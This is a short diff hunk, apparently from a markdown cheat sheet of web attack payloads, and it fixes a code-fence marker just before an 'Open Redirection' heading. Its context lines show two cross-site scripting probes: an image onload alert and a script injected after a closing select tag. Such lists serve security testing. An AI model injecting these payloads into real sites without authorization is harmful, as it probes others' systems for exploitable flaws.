@@ -170,7 +170,5 @@ IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
 
 '></select><script>alert(1770)</script>
 
-
-
-'''
+```
 # OPEN REDIRECTION
